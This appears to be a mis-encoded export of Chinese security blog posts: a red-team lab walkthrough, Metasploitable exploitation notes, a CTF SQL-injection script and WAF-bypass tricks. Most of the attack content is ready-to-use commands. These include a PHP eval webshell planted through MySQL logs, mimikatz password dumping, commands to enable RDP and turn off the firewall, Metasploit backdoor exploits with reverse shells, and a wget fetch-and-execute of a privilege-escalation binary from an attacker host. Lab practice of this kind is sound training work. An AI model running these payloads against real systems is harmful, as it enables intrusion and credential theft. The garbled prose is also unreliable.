ç­‰çŠ¶æ€ã€‚ ç™»å½•ç”¨æˆ·åï¼šæ˜¾ç¤ºè¿œç¨‹è®¾å¤‡ç”¨å“ªä¸ªè´¦å·ç™»å½•åˆ°ä½ çš„ç”µè„‘ï¼ˆä»…éƒ¨åˆ†åœºæ™¯æ˜¾ç¤ºï¼‰ã€‚ åˆ°phpadminè®¿é—®å†™ä¸€å¥è¯ 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot; INTO OUTFILE &quot;C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\hack.php&quot;; å‘½ä»¤æ‰§è¡Œåå‡ºç°äº†æŠ¥é”™ï¼Œæç¤º MySQL æœåŠ¡å™¨é…ç½®äº† secure-file-priv é€‰é¡¹ï¼Œé™åˆ¶äº†è¯¥å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢è¯¥é€‰é¡¹çš„çŠ¶æ€ï¼š 1SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;; ä»ä¸Šå›¾å¯çŸ¥ secure-file-priv é€‰é¡¹è¢«è®¾ç½®ä¸ºäº† NULL, MySQL æœåŠ¡å™¨ä¼šç¦æ­¢æ–‡ä»¶å¯¼å…¥ä¸å¯¼å‡ºåŠŸèƒ½ã€‚å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ secure-file-priv é€‰é¡¹çš„å€¼ä¸ºç©ºå­—ç¬¦ï¼Œä½¿å…¶ä¸åšç›®å½•é™åˆ¶: 1SET GLOBAL secure_file_priv = ''; ç°åœ¨è¯¥å˜é‡ä¸ºåªè¯»ï¼Œæ— æ³•ä¿®æ”¹å°è¯•ä» MySQL å‘½ä»¤æ‰§è¡Œæ—¥å¿—ä¸‹æ‰‹ï¼Œæ‰§è¡Œ SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;ï¼ŒæŸ¥çœ‹å‘½ä»¤æ‰§è¡Œæ—¥å¿—å¼€å…³å’Œæ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š 12SET GLOBAL general_log=on; SET GLOBAL general_log_file='C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php'; å‘½ä»¤æ‰§è¡Œä¼šè‡ªåŠ¨åœ¨å‘½ä»¤åé¢åŠ ä¸Šæ³¨é‡Šæç¤ºè¿”å›ç»“æœã€‚æ‰§è¡Œ SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;; æ‰‹åŠ¨éªŒè¯ä¸€ä¸‹ï¼š ä»ä¸Šå›¾å¯çŸ¥ä¿®æ”¹æˆåŠŸã€‚åé¢æ‰§è¡Œçš„æ‰€æœ‰ MySQL å‘½ä»¤éƒ½ä¼šè¢«è®°å½•åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ hack.php æ–‡ä»¶ä¸­ (åªè®°å½•å‘½ä»¤ï¼Œä¸è®°å½•ç»“æœ)ï¼Œæ­¤æ—¶å†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†ä¸€å¥è¯æœ¨é©¬è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼š 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot;; å†…ç½‘æ‰“é¶å…ˆä¼ csé©¬ğŸåˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶åç›´æ¥ç‚¹é¼ æ ‡å°±ææƒæˆåŠŸäº† è¿™é‡Œæˆ‘ä»¬æ¥çœ‹å¯†ç è¾“å…¥ 1logonpasswords å¾—åˆ°ä¸Šå›¾åç›´æ¥å»å°±å¾—åˆ°äº†å¯†ç ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° administrator ç”¨æˆ·çš„ç™»å½•å¯†ç ä¸º admin123!, æ‰€å±åŸŸä¸º god, å¯†ç æ¥æºä¸º mimikatz å·¥å…·ã€‚ æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æ§åˆ¶ (RDP) 3389 ç«¯å£æ˜¯å¦å¯ç”¨ï¼š 1shell netstat -ano | findstr 3389 è¾“å‡ºä¸ºç©ºè¡Œï¼Œè¯´æ˜æœªå¯ç”¨ï¼Œä½¿ç”¨æ­¤å‘½ä»¤å¼€å¯ RDPï¼š 1shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f æ“ä½œæˆåŠŸï¼Œå†æ¬¡æ‰§è¡Œ shell netstat -ano | findstr 3389 éªŒè¯ç»“æœï¼š å¯ç”¨æˆåŠŸã€‚WIN+R æ‰“å¼€è¿è¡Œçª—å£è¾“å…¥ mstsc.exe å›è½¦æ‰“å¼€ RDP å®¢æˆ·ç«¯ç¨‹åºï¼Œä½¿ç”¨ god/administrator ç”¨æˆ·è¿æ¥æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢ï¼šè¿™é‡Œæ˜¯GOD\\Administratorå‘ç°è¿æ¥å¤±è´¥ï¼Œnampæ‰«ä¸€ä¸‹ 1nmap -Pn -n -p 3389 192.168.52.10 å‘ç°ç«¯å£ä¸º filtered è¢«è¿‡æ»¤çŠ¶æ€ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨é˜²ç«å¢™æ‹¦æˆªï¼Œæ‰§è¡Œ shell netsh advfirewall show allprofiles å‘½ä»¤æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ï¼š ä»ä¸Šå›¾å¯çœ‹åˆ°é˜²ç«å¢™çŠ¶æ€ä¸ºæ‰“å¼€ä¸”æ‹¦æˆªäº†å…¥ç«™æ•°æ®ï¼Œæ‰§è¡Œ shell netsh advfirewall set allprofiles state off å‘½ä»¤å°è¯•å…³é—­æœåŠ¡å™¨çš„é˜²ç«å¢™ (æˆ–è€…æ‰§è¡Œæ­¤å‘½ä»¤å•ç‹¬æ”¾è¡Œ RDP æµé‡ netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389)ï¼š æ‰§è¡ŒæˆåŠŸï¼Œå†æ¬¡éªŒè¯é…ç½®ï¼šshell netsh advfirewall show allprofiles è¿æ¥æˆåŠŸï¼ŒåŒæ—¶è§‚å¯Ÿåˆ°æ¡Œé¢ (å·¦ä¸Šè§’) ä¸Šæœ‰ nmap åº”ç”¨ç¨‹åºã€‚ åœ¨ CS ä¸­æ‰§è¡Œ shell ipconfig ä»ä¸Šå›¾å¯çœ‹åˆ°æœåŠ¡å™¨é™¤äº†æœ‰å’Œå’Œæ”»å‡»æœºåŒç½‘æ®µçš„ 192.168.52.10/24 çš„å¤–ç½‘ IP ä»¥å¤–ï¼Œè¿˜æœ‰å†…ç½‘ IP192.168.52.143/24ã€‚ ç»§ç»­åœ¨ CS ä¸­ä½¿ç”¨æœåŠ¡å™¨è‡ªå¸¦çš„ nmap æ‰«æå†…ç½‘æœ‰å“ªäº›æ´»è·ƒä¸»æœºï¼šshell nmap -sn -PR -n 192.168.52.143/24ã€‚æ³¨æ„ï¼Œæ­¤å‘½ä»¤å¿…é¡»åœ¨ Administrator ç”¨æˆ·çš„ beacon æ§åˆ¶å°ä¸‹æ‰§è¡Œï¼Œåœ¨ System ç”¨æˆ·ä¸‹æ— æ³•æ‰§è¡Œï¼Œå› ä¸º System ç”¨æˆ·æ— æ³•æ­£ç¡®è¯»å–åˆ°ç¯å¢ƒå˜é‡ï¼Œé™¤éä½¿ç”¨å‘½ä»¤çš„å®Œæ•´è·¯å¾„æ¥æ‰§è¡Œï¼Œæ¯”å¦‚ shell &quot;C:\\Program Files (x86)\\Nmap\\nmap.exe&quot; -sn -PR -n 192.168.52.143/24: 1234567192.168.52.1192.168.52.141192.168.52.254192.168.52.2192.168.52.138192.168.52.10192.168.52.143 3.1.6 åŸŸæˆå‘˜èº«ä»½ç¡®å®šç”±äºå‰é¢å·²ç»ç¡®å®š Win7 æœåŠ¡å™¨æ‰€å±åŸŸä¸º god, å› æ­¤å¦å¤–ä¸¤å°æ´»è·ƒä¸»æœºä¸€å®šæœ‰ä¸€å°æ˜¯åŸŸæ§åˆ¶å™¨ DC, ä½¿ç”¨ net view å‘½ä»¤ (æ³¨æ„ä¸è¦åŠ  shell å‰ç¼€ï¼Œå¦åˆ™ç»“æœä¸å®Œæ•´) æ¢æµ‹åŸŸå†…ä¸»æœºï¼š 1net view ä»ä¸Šå›¾å¯çœ‹åˆ° 192.168.52.138 çš„ä¸»æœºåä¸º OWA(å…¨ç§°åº”è¯¥æ˜¯ Outlook Web App)ï¼Œä¸ºä¸»åŸŸæ§åˆ¶å™¨ PDC (Primary Domain Controller),192.168.52.141 çš„ä¸»æœºåä¸º ROOT-TVI862UBEH, å’Œ Win7 æœåŠ¡å™¨ä¸€æ ·åŒå±äº god åŸŸçš„åŸŸæˆå‘˜ã€‚ å‘½ä»¤æ‰§è¡Œå®Œæˆåï¼ŒCS ä¼šè‡ªåŠ¨å°†æ¢æµ‹åˆ°çš„è®¾å¤‡åŠ å…¥â€ ç›®æ ‡åˆ—è¡¨â€(æ³¨æ„ï¼Œå›¾ä¸­çš„ 198.18.*.* ä¸ºæœ¬åœ°åŸºå‡†æµ‹è¯• IPï¼Œåœ¨è¿™é‡Œæ— å®é™…æ„ä¹‰ï¼Œä¸å¿…åœ¨æ„): 3.1.7 åŸŸæˆå‘˜ç«¯å£æ‰«æåœ¨ CS çš„ Administrator ç”¨æˆ·çš„ beacon æ§åˆ¶å°ä¸­ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹ä¸¤æ¡å‘½ä»¤æ¥åˆ†åˆ«æ‰«æ 192.168.52.138 å’Œ 192.168.52.141 ä¸¤å°ä¸»æœºçš„ç«¯å£çŠ¶æ€ï¼š 12shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138 shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141 ä»ä¸Šé¢ä¸¤å¼ å›¾ç‰‡ä¸­å¯ä»¥çœ‹å‡ºè¿™ä¸¤å°ä¸»æœºéƒ½å¼€æ”¾äº† SMB åè®®çš„ 445 ç«¯å£ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥å°è¯•ä½¿ç”¨ CS å†…ç½®çš„ psexec å·¥å…·è·å–ç›®æ ‡çš„ system shellã€‚ 3.2 æ¨ªå‘ç§»åŠ¨ åˆ›å»ºä¸€ä¸ª SMB ç›‘å¬å™¨ï¼Œåå­—ä¸º wxdxï¼ŒPayload ä¸º Beacon SMBï¼š METASPLOITABLE-1kaliæ”»å‡»æœºï¼Œinet 172.20.10.4 netmask 255.255.255.240 ç½‘æ®µï¼š172.20.10.0/28 METASPLOITABLE-1 é¶æœºï¼Œaddr:172.20.10.3Bcast:172.20.10.15Mask:255.255.255.240 1netdiscover -r 172.20.10.0/28 -i eth0 æ‰«åˆ°IP nmapæ‰«ç«¯å£ 12nmap 172.20.10.3nmap -v -T4 -p- -A -oN nmap.log 172.20.10.3 æ‰«ç›®å½• 1python3 dirsearch -u 172.20.10.3 åˆ° 1http://172.20.10.3/tikiwiki çœ‹çœ‹ å‘ç°TikiWiki 1.9.5æ˜¯å­˜åœ¨RCEæ¼æ´çš„ çˆ†ç ´FTPæˆ‘ä»¬è¿™é‡Œå…ˆå°è¯•çˆ†ç ´ä¸€ä¸‹ftp 1hydra -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/pass.txt ftp://172.20.10.3 å·²ç»æˆåŠŸçˆ†ç ´å‡º 4 ç»„æœ‰æ•ˆçš„ FTP è´¦å·å’Œå¯†ç ï¼Œå…·ä½“ä¿¡æ¯å¦‚ä¸‹ï¼š è´¦å·ï¼špostgresï¼Œå¯†ç ï¼špostgres è´¦å·ï¼šuserï¼Œå¯†ç ï¼šuser è´¦å·ï¼šserviceï¼Œå¯†ç ï¼šservice è´¦å·ï¼šmsfadminï¼Œå¯†ç ï¼šmsfadmin çˆ†ç ´SSHä¹å¤´è›‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆçˆ†ä¸å‡ºæ¥ 1medusa -h 172.20.10.3 -U user.txt -P pass.txt -M ssh -n 22 -t 4 -v 4 1telnet 172.20.10.3 è¾“å…¥ç”¨æˆ·åå¯†ç ä¹Ÿæ˜¯æˆåŠŸæ‹¿ä¸‹æƒé™ ç«¯å£æ¸—é€åˆ©ç”¨metasploitç„¶åå¯åŠ¨msf 1msfconsole ç«¯å£1ï¼š6637â€”â€”-irc_3281_backdoorç™»å½•msf 1search irc æ‰¾åˆ°å¯¹åº”æ¨¡å— 1use exploit/unix/irc/unreal_ircd_3281_backdoor è¿›å…¥å¯¹åº”æ¨¡å— æŸ¥çœ‹é…ç½® show options 1show options è®¾ç½®ä¸»æœºå è¿›è¡Œæ¼æ´åˆ©ç”¨ exploit åˆ©ç”¨ï¼ŒæˆåŠŸè·å–ä¼šè¯ï¼Œrootæƒé™ 123set rhost 172.20.10.3set LHOST 172.20.10.4set LPORT 4444 RHOSTæ˜¯é¶æœºIPRPORTè®¾ç½®æ”»å‡»ç›®æ ‡ä¸»æœºç«¯å£å·LHOSTæ˜¯æ”»å‡»æœºIP è¿™é‡Œé¶æœºçš„6687ç«¯å£æ²¡æœ‰å¼€æ”¾æ‰€ä»¥æ²¡æœ‰æˆåŠŸåˆ©ç”¨åˆ°å¼€æ”¾äº†å¦‚ä¸‹ç«¯å£ï¼Œç„¶åä¸Šé¢é‚£ä¸ªnmapä¹Ÿèƒ½çœ‹å¾—åˆ°å¼€æ”¾äº†å“ªäº›ç«¯å£å¦‚æœåˆ©ç”¨åˆ°äº†æ˜¯è¿™æ ·çš„ ç«¯å£2ï¼š6200â€”â€”-vsftpd_234_backdoor6200é¶æœºä¹Ÿæ²¡å¼€æ”¾ï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯è®²ä¸€ä¸‹æ‰‹æ³• åˆ©ç”¨metasploitæ‰¾åˆ°åˆ©ç”¨æ¨¡å— 1search sftpd åˆ‡æ¢æ¨¡å— æŸ¥çœ‹é…ç½® 12use exploit/unix/ftp/vsftpd_234_backdoorshow options åå¼¹ä¼šè¯ï¼Œrootæƒé™ 12345678910set RHOSTS ç›®æ ‡IPset RPORT 21 #vsftpd é»˜è®¤ç«¯å£ä¸º 21set payload cmd/unix/reverseset LHOST æ”»å‡»æœºIPset LPORT 4444exploit 1id # è‹¥æ˜¾ç¤º uid=0(root)ï¼Œåˆ™å·²è·å– root æƒé™ æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œå¯»æ‰¾ææƒæ¼æ´ 12cat /etc/os-release # æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ uname -r # æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ ææƒåˆ©ç”¨å†…æ ¸æ¼æ´ææƒï¼ˆç¤ºä¾‹ï¼šè„ç‰›æ¼æ´ï¼Œé€‚ç”¨äºç‰¹å®šå†…æ ¸ç‰ˆæœ¬ï¼‰åœ¨æ”»å‡»æœºç”Ÿæˆææƒè„šæœ¬ï¼ˆéœ€å¯¹åº”ç›®æ ‡æ¶æ„ï¼Œå¦‚ x86/x64ï¼‰ 1msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -f elf &gt; dirtycow.elf åœ¨ç›®æ ‡ä¼šè¯ä¸­ä¸‹è½½å¹¶æ‰§è¡Œï¼ˆæ”»å‡»æœºéœ€å¼€å¯ HTTP æœåŠ¡ï¼Œå¦‚ python3 -m http.server 80ï¼‰ï¼š 1234# ç›®æ ‡ shell ä¸­æ“ä½œwget http://æ”»å‡»æœºIP:80/dirtycow.elf # ä¸‹è½½ææƒç¨‹åºchmod +x dirtycow.elf # èµ‹äºˆæ‰§è¡Œæƒé™./dirtycow.elf # æ‰§è¡Œææƒï¼ŒæˆåŠŸåä¼šè·å¾— root shell åˆ©ç”¨ SUID ç¨‹åºææƒæŸ¥æ‰¾å…·æœ‰ SUID æƒé™çš„å±é™©ç¨‹åºï¼ˆå¦‚ findã€bash ç­‰ï¼‰ï¼š 1find / -perm -4000 2&gt;/dev/null # åˆ—å‡ºæ‰€æœ‰ SUID ç¨‹åº # è‹¥å­˜åœ¨å¯åˆ©ç”¨ç¨‹åºï¼Œä¾‹å¦‚ findï¼š find / -exec /bin/sh \\; -quit # é€šè¿‡ find æ‰§è¡Œ shell è·å– root vsftpd 2.3.4 åé—¨çš„å…¸å‹ç‰¹å¾æ˜¯è§¦å‘ååœ¨ç›®æ ‡ 6200 ç«¯å£å¼€æ”¾ shellï¼ŒMetasploit æ¨¡å—ä¼šè‡ªåŠ¨è¿æ¥è¯¥ç«¯å£å¹¶åå¼¹ä¼šè¯ã€‚ ç«¯å£3ï¼š1524â€”â€”-ingrelock_backdooråˆ©ç”¨telnetè¿æ¥1524ï¼Œç›´æ¥è¿”å›rootä¼šè¯ç«¯å£3ã€1524â€”â€”-ingrelock_backdoor åˆ©ç”¨telnetè¿æ¥1524ï¼Œç›´æ¥è¿”å›rootä¼šè¯ ç«¯å£4ï¼š1099â€”â€”-distccç¨‹åºæ¼æ´â€”-ingrelockåˆ©ç”¨metasploit è¿”å›å¯¹è¯ ç«¯å£5ï¼š139â€”â€”-sambaä¸º3.0æ¼æ´å…ˆç”¨nmapè¿›è¡Œè¯¦ç»†æ‰«æ 1nmap -v -A -T4 192.168.195.133 metasploitæœ‰ä¼—å¤šæ‰«ææ¨¡å—ï¼Œä»¥é€‚åº”ä¸åŒçš„éœ€è¦ã€‚åœ¨metasploitä¸­åŒæ ·å¯ä»¥ä½¿ç”¨nmapè¿›è¡Œæ‰«æã€‚åœ¨å‘½ä»¤è¡Œä¸­ç›´æ¥é”®å…¥æŒ‡ä»¤å³å¯ã€‚ Samba åˆ©ç”¨metasploit ç«¯å£6ã€8180â€”â€”-Apache Tomcatå¼±å£ä»¤1234567891011121314åœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤â€œnmap 172.20.10.3â€ï¼Œå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œç«¯å£æ‰«æï¼Œå‘ç°å¼€æ”¾8180ç«¯å£å¹¶ä¸”è¿è¡Œç€ApacheTomcat/CoyoteJSP engine1.1ã€‚åœ¨ç»ˆç«¯ä¸­è¾“å…¥å‘½ä»¤â€œmsfconsoleâ€ï¼Œå¯åŠ¨MSFç»ˆç«¯ã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥å‘½ä»¤â€œsearch tomcatâ€, æœç´¢tomcatçš„ç›¸å…³å·¥å…·å’Œæ”»å‡»è½½è·ã€‚åœ¨ç»ˆç«¯è¾“å…¥â€œuse auxiliary/scanner/http/tomcat_mgr_loginâ€ï¼Œ å¯ç”¨æ¼æ´åˆ©ç”¨æ¨¡å—, æç¤ºç¬¦å°±ä¼šæç¤ºè¿›å…¥åˆ°è¯¥è·¯å¾„ä¸‹ã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset RHOSTS 172.20.10.3â€,è®¾ç½®æ”»å‡»ç›®æ ‡ä¸»æœºIPã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset RPORT 8180â€,è®¾ç½®æ”»å‡»ç›®æ ‡ä¸»æœºç«¯å£å·.åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œexploitâ€, å®æ–½æ”»å‡»ã€‚è·å¾—ç”¨æˆ·åtomcat,å¯†ç tomcatã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œuse exploit/multi/http/tomcat_mgr_deployâ€, å¯ç”¨æ¼æ´åˆ©ç”¨æ¨¡å—, æç¤ºç¬¦å°±ä¼šæç¤ºè¿›å…¥åˆ°è¯¥è·¯å¾„ä¸‹ã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset RHOST 172.20.10.3â€,è®¾ç½®æ”»å‡»çš„ç›®æ ‡ä¸»æœºIPã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset RPORT 8180â€,è®¾ç½®æ”»å‡»çš„ç›®æ ‡ä¸»æœºç«¯å£å·ã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset username tomcatâ€,è®¾ç½®æ”»å‡»æ—¶ä½¿ç”¨çš„ç™»å½•è´¦å·tomcatã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œset userpassword tomcatâ€,è®¾ç½®æ”»å‡»æ—¶ä½¿ç”¨çš„å¯†ç tomcatã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œexploitâ€,å¼€å§‹æ”»å‡»ï¼Œå»ºç«‹ä¼šè¯ã€‚åœ¨ç»ˆç«¯ä¸‹è¾“å…¥â€œgetuidâ€,æŸ¥çœ‹è·å–çš„ç”¨æˆ·æƒé™ã€‚ å¾—åˆ°ç”¨æˆ·åå¯†ç åˆ†åˆ«ä¸ºtomcatï¼Œtomcat ä¸Šé¢ä¸æˆåŠŸ 12set HttpUsername tomcatset HttpPassword tomcat å¯èƒ½ç‰ˆæœ¬å¤ªè€äº†ï¼Œtomcatå·²ç»åšå‡ºé˜²æŠ¤äº† ç«¯å£7ã€80â€”â€”-PHP CGIå‚æ•°æ³¨å…¥æ‰§è¡Œæ¼æ´ ç½‘ç«™æ¸—é€å‰é¢ä¸æ˜¯dirsearchæ‰«å‡ºæ¥ï¼Œphpinfoå’Œtikiwiå—è¿™é‡Œæˆ‘ä»¬å°±å¯¹è¿™ä¸¤ä¸ªåŸŸåè¿›è¡Œæ“ä½œ 1![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476602-85919f53-59fc-46d5-a201-15752a43b7e4.png)","link":"/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"},{"title":"","text":"ç½‘é¼æ¯2018â€“Unfinish å…ˆç™»å½•çœ‹ä¸€ä¸‹ éšä¾¿æ³¨å†Œä¸€ä¸ª å‘ç°å†ç™»å½•æˆåŠŸåç”¨æˆ·åä¼šå›æ˜¾æˆ‘ä»¬è¿™é‡Œå…ˆæ‰«ä¸€éçœ‹ä¸€çœ¼ å‘ç°æ˜¯å­˜åœ¨sqlç›²æ³¨çš„é¢˜ç›®æç¤ºSQLï¼Œåœ¨æ³¨å†Œé¡µé¢æµ‹è¯•æ— æœï¼Œä¸”å‘ç°è¾“å…¥æ¡†é™åˆ¶äº†ç‰¹æ®Šå­—ç¬¦ï¼Œè¦ç”¨BurpSuiteæäº¤payloadã€‚username=aliceâ€™ and left(database(),1)&gt;â€™aâ€™# å‘ç°è¢«è¿‡æ»¤äº†å¾—åˆ°nonoè¿™é‡Œæˆ‘ä»¬å»fuzzæµ‹è¯•ä¸€ä¸‹å‘ç°informationå’Œé€—å·ï¼Œç›²æ³¨å¯èƒ½ä¸å¤ªè¡Œäº†ç»è¿‡å°è¯•ï¼Œæ„é€ username=select database()ï¼Œç™»å½•åæ˜¾ç¤ºç”¨æˆ·åè¿˜æ˜¯ä¸ºselect database()ï¼Œè¯´æ˜åå°ä»£ç å¯èƒ½æŠŠusernameç”¨å•å¼•å·å¼•èµ·æ¥äº†ï¼Œå¯¼è‡´å…¶æ— æ³•æ˜¾ç¤ºã€‚ 10â€™+ascii(substr(database() from 1 for 1))+â€™0; 1email=test2%40qq.com&amp;username=0'%2B(select hex(hex(database())))%2B'0&amp;password=123456 HEXè½¬bytes373736353632-ã€‹776562-ã€‹web 12345678910111213141516171819202122232425262728293031323334import requests import logging import re from time import sleep # LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) def search(): flag = '' url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/' url1 = url+'register.php' url2 = url+'login.php' for i in range(100): sleep(0.3)#ä¸åŠ sleepå°±429äº† #å…ˆåˆå§‹åŒ–æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œä¸é‡å¤çš„ç”¨iï¼Œè¿™ä¸ªæ˜¯æ³¨å…¥è¯­å¥&quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i) data1 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;username&quot; : &quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #ç™»å½•è¿™ä¸ªè´¦å· data2 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #å‘é€è¯·æ±‚è·å¾—å“åº” r1 = requests.post(url1, data=data1) #å‘é€è¯·æ±‚è·å¾—å“åº” r2 = requests.post(url2, data=data2) #æŸ¥æ‰¾é‚£ä¸ªå›æ˜¾çš„åœ°æ–¹ \\s*(\\d*)\\s* åŒ¹é…ã€Œå‰åå¸¦ä»»æ„ç©ºç™½çš„æ•°å­—ã€ res = re.search(r'&lt;span class=&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r2.text) #æå–çº¯æ•°å­—ï¼ˆè¿‡æ»¤å¯èƒ½çš„ç©ºæ ¼ï¼‰ res1 = re.search(r'\\d+', res.group()) #æ‹¼æ¥flag flag = flag+chr(int(res1.group())) print(flag) print(&quot;final:&quot;+flag) if __name__ == '__main__': search()","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2018--Unfinish/"},{"title":"wafç»•è¿‡æ‰‹æ³•","text":"wafç»•è¿‡æ‹äº†æ‹ä½ -å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å° æ­å»ºé›·æ± wafè¿›è¡Œæµ‹è¯• åœ¨httpåè®®å±‚é¢å¯¹æˆ‘ä»¬çš„æ•°æ®åŒ…è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå‘ç°äº†å¯èƒ½æ˜¯å¸¦æœ‰æ”»å‡»æ€§çš„è¯­å¥ï¼Œå°±ä¼šè¿›è¡Œæ‹¦æˆª å¤§å°å†™ç»•1unIoN Select åŒå†™ç»•å…³é”®è¯è¿‡æ»¤æ›¿æ¢ 1ununionion ==&gt; å»æ‰union ==&gt; union ç¼–ç ç»•12345678910URLç¼–ç ï¼šwafæ²¡è¯†åˆ«ï¼Œä½†åç«¯è‡ªåŠ¨è§£ç URLç¼–ç UNICODE //JSONçš„Unicodeè½¬ä¹‰ï¼ŒJSON è§£æå™¨ï¼ˆå¦‚ Java çš„ Jacksonã€Python çš„ `json` æ¨¡å—ã€Go çš„ `encoding/json`ï¼‰åå…­è¿›åˆ¶ç¼–ç å…¶ä»–åç«¯ä¼šè§£æçš„ç¼–ç  ç¼–ç ç±»å‹ ç¤ºä¾‹ï¼ˆä»¥orä¸ºä¾‹ï¼‰ åç«¯è§£ææ–¹å¼ Base64 ç¼–ç  b3I= Pythonï¼šbase64.b64decode(&quot;b3I=&quot;).decode() ASCII åå…­è¿›åˆ¶ï¼ˆ\\xï¼‰ \\x6f\\x72 Python/PHP ç›´æ¥è§£æï¼ˆå¦‚ Pythonb&quot;\\x6f\\x72&quot;.decode()ï¼‰ åŒé‡ URL ç¼–ç  %256F%2572 åç«¯å¤šæ¬¡è§£ç ï¼ˆå…ˆè§£%25ä¸º%ï¼Œå†è§£%6F%72ä¸ºorï¼‰ åƒåœ¾å­—ç¬¦1234GET /foo?sqli=111...80ä¸‡ä¸ª1...111'+and+2*3=6+--+ HTTP/1.1User-Agent: Mozilla/5.0Host: HostAccept: */* WAFè®¾ç½®äº†è¿‡æ»¤æ•°æ®åŒ…é•¿åº¦ï¼Œå¦‚æœæ•°æ®åŒ…è¿‡å¤§ç›´æ¥ä¸æ£€æµ‹ 123application/x-www-form-urlencoded; charset=ibm037multipart/form-data; charset=ibm037, boundary=blahmultipart/form-data; boundary=blah ; charset=ibm037 ä¿®æ”¹ç¼–ç ç»•è¿‡ï¼Œå¤§éƒ¨åˆ†wafè¯†åˆ«çš„æ˜¯UTF8ç¼–ç æ£€æµ‹ åˆ†å—ä¼ è¾“burpæ’ä»¶ï¼šhttps://github.com/c0ny1/chunked-coding-converter.git åœ¨å¤´éƒ¨åŠ å…¥ Transfer-Encoding: chunked ä¹‹åï¼Œå°±ä»£è¡¨è¿™ä¸ªæŠ¥æ–‡é‡‡ç”¨äº†åˆ†å—ç¼–ç ã€‚è¿™æ—¶ï¼Œpostè¯·æ±‚æŠ¥æ–‡ä¸­çš„æ•°æ®éƒ¨åˆ†éœ€è¦æ”¹ä¸ºç”¨ä¸€ç³»åˆ—åˆ†å—æ¥ä¼ è¾“ã€‚æ¯ä¸ªåˆ†å—åŒ…å«åå…­è¿›åˆ¶çš„é•¿åº¦å€¼å’Œæ•°æ®ï¼Œé•¿åº¦å€¼ç‹¬å ä¸€è¡Œï¼Œé•¿åº¦ä¸åŒ…æ‹¬å®ƒç»“å°¾çš„ï¼Œä¹Ÿä¸åŒ…æ‹¬åˆ†å—æ•°æ®ç»“å°¾çš„ï¼Œä¸”æœ€åéœ€è¦ç”¨0ç‹¬å ä¸€è¡Œè¡¨ç¤ºç»“æŸã€‚ HTTPåè®®ç»•è¿‡HTTP 0.9HTTP 0.9åè®®åªæœ‰GETæ–¹æ³•ï¼Œä¸”æ²¡æœ‰HEADERä¿¡æ¯ç­‰ï¼ŒWAFå°±å¯èƒ½è®¤ä¸å‡ºè¿™ç§çš„è¯·æ±‚åŒ…ï¼Œäºæ˜¯è¾¾åˆ°ç»•è¿‡WAFçš„æ•ˆæœï¼Œåœ¨headeræ·»åŠ payload 